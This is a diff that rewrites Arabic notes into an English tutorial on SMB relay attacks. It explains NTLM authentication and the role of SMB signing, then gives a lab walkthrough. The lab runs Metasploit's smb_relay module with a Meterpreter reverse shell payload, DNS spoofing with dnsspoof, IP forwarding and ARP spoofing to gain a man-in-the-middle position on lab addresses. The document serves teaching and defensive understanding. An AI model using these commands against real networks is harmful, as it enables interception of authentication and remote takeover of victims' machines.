@@ -1,322 +1,376 @@
+# SMB Relay Attack
 
-# SMB
-## Server Message Block
+## Overview
 
-بروتوكول تستخدمه ويندوز لـ:
+An **SMB Relay Attack** is a technique that allows an attacker to intercept and relay a victim's NTLM authentication to another SMB server without cracking the password or NTLM hash.
 
-- مشاركة الملفات
-- الطابعات
-- الشيرز
-- Remote administration
-- IPC
+Instead of stealing the password, the attacker simply forwards the authentication process to another server, which accepts it as if it came directly from the legitimate user.
+
+This attack is only possible when the target SMB server does **not** require **SMB Signing**.
 
 ---
 
-# مثال
+# What is SMB?
 
-لما تفتح:
+**SMB (Server Message Block)** is a Windows protocol used for:
 
-```
+- File sharing
+- Printer sharing
+- Shared folders
+- Remote administration
+- Inter-Process Communication (IPC)
+
+---
+
+# Example
+
+When accessing a shared folder such as:
+
+```text
 \\SERVER\Documents
 ```
 
-أنت تستخدم SMB.
-
-
-# ماذا يحدث عند الاتصال؟
-
-الجهاز يقول:
-
-> “أثبت هويتك.”
-
-
-# هنا يأتي NTLM Authentication
-
-ويندوز غالباً يستخدم:
-
-## NTLM
-
-لإثبات الهوية.
-
-
-# كيف يعمل NTLM بشكل مبسط؟
-
-
-# 1) Client يطلب الدخول
-
-مثلاً:
-
-```
-أنا المستخدم أحمد
-```
-
-
-# 2) Server يرسل Challenge
-
-رقم عشوائي.
-
-
-# 3) Client يستخدم Password Hash
-
-لإنشاء Response.
-
-
-# 4) Server يتحقق
-
-إذا صحيح:  
-✅ دخول.
+Windows is communicating using the SMB protocol.
 
 ---
 
-# المهم جداً 
+# Authentication with NTLM
 
-## الباسورد لا يُرسل مباشرة.
+When a client connects to an SMB server, Windows typically authenticates using **NTLM (NT LAN Manager)**.
 
-
-# إذاً أين المشكلة؟
-
-المشكلة:  
-أن الـ authentication نفسها  
-يمكن:
-
-## إعادة استخدامها مؤقتاً.
-
-
-# هنا ظهر مفهوم SMB Relay
-
-
-# ما معنى Relay؟
-
-Relay =
-
-## إعادة تمرير
-
-
-# الفكرة الأساسية
-
-بدل أن أكسر الـ NTLM،  
-أقوم فقط:
-
-> بإعادة تمريره لسيرفر آخر.
-
-
-# مثال 
-
-
-# الضحية تقول للمهاجم:
-
-```
-أنا أحمد وهذا إثباتي
-```
-
-
-# المهاجم لا يفهم الإثبات،
-
-لكن يقول:
-
-```
-سأرسله كما هو للسيرفر الحقيقي 
-```
-
-
-# السيرفر الحقيقي يقول:
-
-```
-أوه هذا أحمد فعلاً
-```
-
-ويسمح بالدخول.
-
-
-# لماذا يحدث هذا؟
-
-لأن بعض السيرفرات:  
-لا تتحقق جيداً من:
-
-- مصدر الـ authentication
-- أو Integrity
-
-خصوصاً إذا:
-
-## SMB Signing Disabled
-
-
-# ما هو SMB Signing؟
-
-ميزة أمان.
-
-تجعل SMB messages:
-
-- موقعة رقمياً
-- وغير قابلة للتعديل أو relay بسهولة
-
-
-# إذا كان Disabled؟
-
-السيرفر يثق بأي authentication صحيح،  
-حتى لو جاء عبر مهاجم.
-
-
-# إذاً SMB Relay يعتمد على ماذا؟
-
-
-# 1) اعتراض الاتصال
-
-MITM.
-
-
-# 2) الضحية تعمل NTLM Authentication
-
-
-# 3) المهاجم يعيد تمرير الـ auth
-
-
-# 4) السيرفر يقبل
+The password itself is **never sent** over the network.
 
 ---
+
+# How NTLM Authentication Works
+
+## Step 1 – Client Requests Authentication
+
+The client sends its username to the server.
+
+Example:
+
+```text
+Username: Ahmed
+```
+
+---
+
+## Step 2 – Server Sends a Challenge
+
+The server generates and sends a random challenge.
+
+---
+
+## Step 3 – Client Creates a Response
+
+The client uses the password hash together with the challenge to generate an authentication response.
+
+---
+
+## Step 4 – Server Verifies the Response
+
+If the generated response is valid, access is granted.
+
+---
+
+# Important Note
+
+During NTLM authentication:
+
+- The password is **never transmitted**
+- The NTLM hash is **never transmitted directly**
+
+Only the calculated authentication response is sent.
+
+---
+
+# Where Is the Vulnerability?
+
+The weakness lies in the authentication process itself.
+
+An attacker can intercept and **relay** the authentication to another SMB server before it expires.
+
+The attacker does **not** need to know the user's password.
+
+---
+
+# What Is SMB Relay?
+
+A relay attack means forwarding the victim's NTLM authentication to another server.
+
+Instead of cracking the authentication, the attacker simply reuses it.
+
+---
+
+# Example
+
+Victim:
+
+```text
+I am Ahmed.
+Here is my authentication.
+```
+
+Attacker:
+
+```text
+I don't understand this authentication,
+but I'll forward it to another server.
+```
+
+Target Server:
+
+```text
+Authentication is valid.
+Access granted.
+```
+
+The server believes it is communicating directly with the legitimate user.
+
+---
+
+# Why Does This Work?
+
+Some SMB servers do not properly verify the origin of NTLM authentication.
+
+This is especially dangerous when:
+
+```text
+SMB Signing = Disabled
+```
+
+Without SMB Signing, authentication messages can be relayed between systems.
+
+---
+
+# What Is SMB Signing?
+
+SMB Signing is a security feature that digitally signs SMB packets.
+
+It protects against:
+
+- Packet modification
+- Packet tampering
+- SMB Relay attacks
+
+If SMB Signing is disabled, relay attacks become possible.
+
+---
+
+# SMB Relay Attack Requirements
+
+A successful SMB Relay attack generally requires:
+
+- SMB Signing disabled on the target server
+- Ability to perform a Man-in-the-Middle (MITM) attack
+- Victim performing NTLM authentication
+- A reachable SMB server that accepts the relayed authentication
+
+---
+
+# Attack Flow
+
+```text
+Victim
+      │
+      │ NTLM Authentication
+      ▼
+Attacker (MITM)
+      │
+      │ Relay Authentication
+      ▼
+Target SMB Server
+```
+
+---
+
 # Lab
 
-# 1) تشغيل SMB Relay في Metasploit
+## Step 1 – Start the SMB Relay Module in Metasploit
 
-```
-msfconsoleuse exploit/windows/smb/smb_relay
+```bash
+msfconsole
+
+use exploit/windows/smb/smb_relay
+
 set SRVHOST 172.16.5.101
 set PAYLOAD windows/meterpreter/reverse_tcp
 set LHOST 172.16.5.101
 set SMBHOST 172.16.5.10
+
 exploit
 ```
 
-|         |                                               |
-| ------- | --------------------------------------------- |
-| SRVHOST | IP جهاز المهاجم الذي سيستقبل SMB (سيرفر وهمي) |
+### Parameter Description
 
-|   |   |
-|---|---|
-|LHOST|مكان رجوع الـ reverse shell|
+| Option | Description |
+|---------|-------------|
+| SRVHOST | IP address of the attacker's fake SMB server |
+| LHOST | IP address that will receive the Meterpreter reverse shell |
+| SMBHOST | Target SMB server that will receive the relayed authentication |
 
-|   |   |
-|---|---|
-|SMBHOST|السيرفر الحقيقي الذي سنعمل له relay|
+---
 
+## Step 2 – Create a Fake DNS Record
 
-# 2) إنشاء ملف DNS مزور
-
-```
+```bash
 echo "172.16.5.101 *.sportsfoo.com" > dns
 ```
 
+### Purpose
 
-# ماذا يفعل؟
+Redirect every request for:
 
-أي طلب لـ:
-
+```text
+*.sportsfoo.com
 ```
-anything.sportsfoo.com
+
+to the attacker's machine.
+
+Example:
+
+```text
+fileserver.sportsfoo.com
 ```
 
-سيتم تحويله إلى:  
-IP المهاجم.
+becomes
 
-
-# 3) تشغيل dnsspoof
-
+```text
+172.16.5.101
 ```
+
+---
+
+## Step 3 – Start DNS Spoofing
+
+```bash
 dnsspoof -i eth1 -f dns
 ```
 
+### Parameters
 
-|الخيار|المعنى|
-|---|---|
-|-i eth1|كرت الشبكة|
-|-f dns|ملف التزوير|
+| Option | Description |
+|---------|-------------|
+| -i eth1 | Network interface |
+| -f dns | Spoofed DNS records file |
 
-تزوير ردود DNS وإرسال IP المهاجم للضحية.
+This tool sends forged DNS responses so the victim resolves the fake server controlled by the attacker.
 
+---
 
-# 4) تفعيل IP Forwarding
+## Step 4 – Enable IP Forwarding
 
-```
+```bash
 echo 1 > /proc/sys/net/ipv4/ip_forward
 ```
 
+### Purpose
 
-السماح لجهاز المهاجم بتمرير الترافيك بين الضحية والراوتر.
+Allows the attacker's machine to forward network traffic between the victim and the gateway.
 
-بدونه:  
-الاتصال ينقطع.
+Without IP forwarding, the victim's connection would be interrupted.
 
-# 5) تنفيذ ARP Spoofing
+---
 
-## الطرف الأول
+## Step 5 – Perform ARP Spoofing
 
-```
+### Spoof the Victim
+
+```bash
 arpspoof -i eth1 -t 172.16.5.5 172.16.5.1
-
-يعني المهاجم يقول للضحية أنا الراوتر
 ```
-## الطرف الثاني
 
-```
+The attacker tells the victim:
+
+> "I am the gateway."
+
+---
+
+### Spoof the Gateway
+
+```bash
 arpspoof -i eth1 -t 172.16.5.1 172.16.5.5
-المهاجم يقول للراوتر أنا الضحية عشان يمرر الاتصال
 ```
 
+The attacker tells the gateway:
 
+> "I am the victim."
 
-|IP|من هو|
-|---|---|
-|172.16.5.5|الضحية|
-|172.16.5.1|الراوتر / Gateway|
-|172.16.5.101|المهاجم|
+---
 
-إنشاء:
+### Network Addresses
 
-## Man In The Middle
+| Address | Device |
+|----------|--------|
+| 172.16.5.5 | Victim |
+| 172.16.5.1 | Gateway |
+| 172.16.5.101 | Attacker |
 
+The attacker is now positioned as a **Man-in-the-Middle (MITM)**.
 
+```text
+Victim
+    ⇄
+Attacker
+    ⇄
+Gateway
 ```
-Victim <--> Attacker <--> Router
-```
-
 
 ![[Pasted image 20260523134213.png]]
-# 6) الضحية تبدأ DNS Queries
 
-مثال:
+---
 
-```
+## Step 6 – Victim Sends DNS Requests
+
+Example:
+
+```text
 A? fileserver.sportsfoo.com
 ```
 
+Instead of receiving the real server's IP address, the attacker responds with:
 
-# ماذا يحدث؟
-
-dnsspoof يرد:
-
-```
+```text
 fileserver.sportsfoo.com = 172.16.5.101
 ```
 
-IP المهاجم.
+The victim now believes the attacker's machine is the legitimate SMB server.
 
-# 7) الضحية تتصل SMB بالمهاجم
+---
 
-الضحية تعتقد:  
-أن المهاجم هو السيرفر الحقيقي.
+## Step 7 – Victim Connects via SMB
 
+The victim automatically performs NTLM authentication to the fake SMB server hosted by the attacker.
 
-# 8) SMB Relay يبدأ
+---
 
-Metasploit يلتقط:
+## Step 8 – SMB Relay Begins
+
+Metasploit captures the NTLM authentication messages:
 
 - NTLM NEGOTIATE
 - NTLM CHALLENGE
-- NTLM AUTH
+- NTLM AUTHENTICATE
+
+and immediately relays them to the real SMB server.
+
+If the server does not enforce SMB Signing, authentication succeeds and the payload is executed.
 
 ![[Pasted image 20260523134233.png]]
 
 ![[Pasted image 20260523134249.png]]
 
-
 ![[Pasted image 20260523134307.png]]
+
+---
+
+# Summary
+
+- SMB is the Windows protocol used for file and printer sharing.
+- NTLM authenticates users without sending the password directly.
+- SMB Relay does **not** crack passwords or NTLM hashes.
+- The attacker forwards the victim's NTLM authentication to another SMB server.
+- The attack relies on a **Man-in-the-Middle (MITM)** position.
+- **SMB Signing** is the primary protection against SMB Relay attacks.
+- If SMB Signing is disabled, servers may accept relayed NTLM authentication, allowing unauthorized access.
